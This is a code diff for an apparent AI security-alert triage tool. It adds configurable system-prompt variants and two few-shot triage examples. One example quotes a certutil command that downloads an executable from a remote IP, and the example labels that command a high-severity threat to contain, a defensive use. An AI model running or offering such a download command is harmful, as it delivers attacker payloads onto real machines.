@@ -7,13 +7,15 @@ submission and rejects/retries anything that does not conform.
 
 from __future__ import annotations
 
+from dataclasses import dataclass
 from typing import Any
 
 from triagemcp.models import Alert, TriageResult
+from triagemcp.tools.mitre import load_mitre_techniques
 
 SUBMIT_TOOL_NAME = "submit_triage"
 
-SYSTEM_PROMPT = """\
+_BASE_PROMPT = """\
 You are TriageMCP, an expert Tier-2 SOC analyst. You triage one security alert at a time.
 
 Method:
@@ -32,13 +34,92 @@ Method:
 Verdict requirements:
 - severity: one of informational, low, medium, high, critical.
 - recommended_action: one of close_false_positive, monitor, investigate, contain, escalate.
-- mitre_technique_id: the best-fit ATT&CK technique id (e.g. T1059.001), even for benign
+- mitre_technique_id: the best-fit ATT&CK technique id, even for benign
   alerts (the technique the activity resembles).
 - confidence: 0.0-1.0, your calibrated confidence in this verdict.
 - rationale: a concise, evidence-based justification referencing what the tools returned.
 
 Do not fabricate tool results. If a submission is rejected for schema reasons, fix it and
 resubmit. Investigate efficiently; do not loop indefinitely."""
+
+
+@dataclass(frozen=True)
+class FewShotExample:
+    alert_id: str
+    title: str
+    alert_text: str
+    verdict: str
+
+
+FEW_SHOT_EXAMPLES: tuple[FewShotExample, ...] = (
+    FewShotExample(
+        alert_id="FEWSHOT-1",
+        title="certutil downloading a remote executable",
+        alert_text="certutil.exe -urlcache -split -f http://203.0.113.8/b.exe b.exe on HR-WS-02.",
+        verdict=(
+            "severity=high, mitre_technique_id=T1105 (Ingress Tool Transfer), "
+            "recommended_action=contain, confidence=0.9 — certutil is a LOLBin used to "
+            "download a remote payload."
+        ),
+    ),
+    FewShotExample(
+        alert_id="FEWSHOT-2",
+        title="Authorized vulnerability scanner tripping IDS",
+        alert_text=(
+            "Hundreds of exploit signatures, all sourced from the approved scanner 10.0.0.5."
+        ),
+        verdict=(
+            "severity=informational, mitre_technique_id=T1046 (Network Service Discovery), "
+            "recommended_action=close_false_positive, confidence=0.85 — known authorized scanner."
+        ),
+    ),
+)
+
+
+def _render_few_shot() -> str:
+    blocks = [
+        f"Worked example ({ex.alert_id}):\nAlert: {ex.alert_text}\nVerdict: {ex.verdict}"
+        for ex in FEW_SHOT_EXAMPLES
+    ]
+    return "\n\n".join(blocks)
+
+
+@dataclass(frozen=True)
+class PromptOptions:
+    """Toggles for composing a system-prompt variant (one knob per experiment)."""
+
+    include_technique_catalog: bool = False
+    require_map_to_mitre: bool = False
+    include_few_shot: bool = False
+
+
+_REQUIRE_MAPPING_TEXT = (
+    "Before submitting, you MUST call map_to_mitre on the alert text and weigh its ranked "
+    "suggestions when choosing mitre_technique_id."
+)
+
+
+def _render_technique_catalog() -> str:
+    lines = [f"- {t.id} {t.name} ({t.tactic})" for t in load_mitre_techniques()]
+    return "Known MITRE ATT&CK techniques (choose mitre_technique_id from this set):\n" + "\n".join(
+        lines
+    )
+
+
+def build_system_prompt(options: PromptOptions | None = None) -> str:
+    """Compose the system prompt for a given experiment variant."""
+    options = options or PromptOptions()
+    parts = [_BASE_PROMPT]
+    if options.include_technique_catalog:
+        parts.append(_render_technique_catalog())
+    if options.require_map_to_mitre:
+        parts.append(_REQUIRE_MAPPING_TEXT)
+    if options.include_few_shot:
+        parts.append(_render_few_shot())
+    return "\n\n".join(parts)
+
+
+SYSTEM_PROMPT = build_system_prompt()
 
 
 def submit_tool_spec() -> dict[str, Any]:
